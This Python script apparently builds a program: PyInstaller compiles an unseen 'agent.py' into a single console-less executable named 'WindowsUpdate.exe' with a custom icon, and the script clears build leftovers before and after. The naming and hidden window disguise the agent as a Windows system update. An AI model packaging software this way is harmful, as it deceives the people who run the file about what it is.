import subprocess
import os
import shutil


def delete_files_and_directories(delete):
    try:
        # Delete scan.spec file
        if os.path.exists("WindowsUpdate.spec"):
            os.remove("WindowsUpdate.spec")
            print("WindowsUpdate.spec deleted successfully.")

        if os.path.exists("WindowsUpdate.exe") and delete:
            os.remove("WindowsUpdate.exe")
            print("WindowsUpdate.exe deleted successfully.")

        # Delete dist directory
        if os.path.exists("dist"):
            shutil.rmtree("dist")
            print("dist directory deleted successfully.")

        # Delete build directory
        if os.path.exists("build"):
            shutil.rmtree("build")
            print("build directory deleted successfully.")

        print("Files and directories deleted successfully.")
    except Exception as e:
        print(f"Error deleting files and directories: {str(e)}")


def send_cmd_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print("Command executed successfully.")
        print("Command output:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {str(e)}")


delete_files_and_directories(True)
send_cmd_command("pyinstaller --noconsole --icon=icon2.ico --onefile --paths venv\Lib\site-packages --distpath=./ --name=WindowsUpdate agent.py")
delete_files_and_directories(False)
